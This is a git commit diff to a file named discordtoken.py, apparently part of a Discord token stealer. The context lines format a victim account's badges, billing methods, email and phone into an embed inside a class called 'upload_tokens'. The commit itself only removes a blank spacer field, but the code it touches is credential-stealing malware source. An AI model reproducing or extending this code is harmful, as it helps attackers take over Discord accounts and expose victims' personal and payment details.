8abe321002bcf8e33a63e7bfca6927913fc1afc5
READDONE313 <98390001+READDONE313@users.noreply.github.com>
2023-05-07 11:51:26 +0000

    Update discordtoken.py

--- src/components/discordtoken.py
+++ src/components/discordtoken.py
@@ -347,8 +347,7 @@ class upload_tokens:
             embed.add_field(name="<a:redboost:996004230345281546> Badges:", value=f"{badges if badges != '' else 'None'}", inline=True)
             embed.add_field(name="<a:pinklv:996004222090891366> Billing:", value=f"{payment_methods if payment_methods != '' else 'None'}", inline=True)
 
-            embed.add_field(name="\u200b", value="\u200b", inline=False)
-            
+
             embed.add_field(name="<a:rainbowheart:996004226092245072> Email:", value=f"{email if email != None else 'None'}", inline=True)
             embed.add_field(name="<:starxglow:996004217699434496> Phone:", value=f"{phone if phone != None else 'None'}", inline=True)    
 
